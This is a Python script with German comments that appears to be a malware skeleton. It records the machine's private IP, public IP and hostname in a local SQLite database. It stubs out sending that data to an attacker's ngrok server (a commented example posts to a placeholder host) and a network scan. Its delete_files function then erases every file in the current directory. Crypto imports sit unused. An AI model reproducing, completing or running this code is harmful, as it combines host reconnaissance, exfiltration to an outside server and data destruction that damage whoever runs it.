from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os
import socket
import requests
import shutil
import hashlib
import sqlite3

# Verbindung zur SQLite-Datenbank herstellen und Tabelle erstellen
conn = sqlite3.connect('data.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS data
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
             private_ip TEXT,
             public_ip TEXT,
             hostname TEXT)''')

def get_private_ip():
    private_ip = socket.gethostbyname(socket.gethostname())
    return private_ip

def get_public_ip():
    public_ip = requests.get('https://api.ipify.org').text
    return public_ip

def get_hostname():
    hostname = socket.gethostname()
    return hostname

def write_to_database(private_ip, public_ip, hostname):
    # Daten in die Datenbank einfügen
    c.execute("INSERT INTO data (private_ip, public_ip, hostname) VALUES (?, ?, ?)", (private_ip, public_ip, hostname))
    conn.commit()

def send_to_ngrok(data):
    # Hier den Code einfügen, um Daten an Ihren ngrok-Server zu senden
    # Zum Beispiel:
    # requests.post('https://your-ngrok-server.com/data', json=data)
    pass

def scan_network():
    # Code für Netzwerkscan hier einfügen
    pass

def main():
    private_ip = get_private_ip()
    public_ip = get_public_ip()
    hostname = get_hostname()

    # Daten in die Datenbank schreiben
    write_to_database(private_ip, public_ip, hostname)

    # Daten an ngrok-Server senden
    data = {'private_ip': private_ip, 'public_ip': public_ip, 'hostname': hostname}
    send_to_ngrok(data)

    # Netzwerk scannen
    scan_network()

    # Verbindung zur Datenbank schließen
    conn.close()

    # Dateien löschen
    delete_files()

def delete_files():
    # Aktuelles Verzeichnis erhalten
    current_directory = os.getcwd()

    # Dateien im aktuellen Verzeichnis löschen
    for filename in os.listdir(current_directory):
        file_path = os.path.join(current_directory, filename)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
                print(f'Deleted file: {file_path}')
        except Exception as e:
            print(f'Error deleting file {file_path}: {e}')

if __name__ == "__main__":
    main()
